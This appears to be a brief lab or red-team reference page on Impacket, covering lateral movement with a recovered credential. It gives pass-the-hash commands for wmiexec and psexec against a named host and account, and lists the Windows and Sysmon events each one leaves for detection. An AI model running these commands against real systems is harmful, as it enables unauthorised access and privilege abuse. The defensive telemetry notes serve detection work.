# Impacket

| | |
|---|---|
| Package | `python3-impacket` on Kali (or `pipx install impacket`) |
| Used in | lateral movement with the recovered credential |
| Scripts | `wmiexec.py`, `psexec.py`, `secretsdump.py` |

## WMI execution with a hash

```
impacket-wmiexec -hashes :<ntlm> C0015/Administrator@FS01
```

Every command is a `Win32_Process.Create` call; the process runs as the authenticating account. There is
no persistent agent, so this is not a C2 session.

## Service execution with a hash

```
impacket-psexec -hashes :<ntlm> C0015/Administrator@FS01
```

Creates a service (7045), runs the command as SYSTEM, removes the service.

## Telemetry

- Security 4624 type 3 (NTLM) and 4672 on the target.
- Sysmon 1 under `WmiPrvSE.exe` for `wmiexec`.
- 7045 plus a service binary for `psexec`.
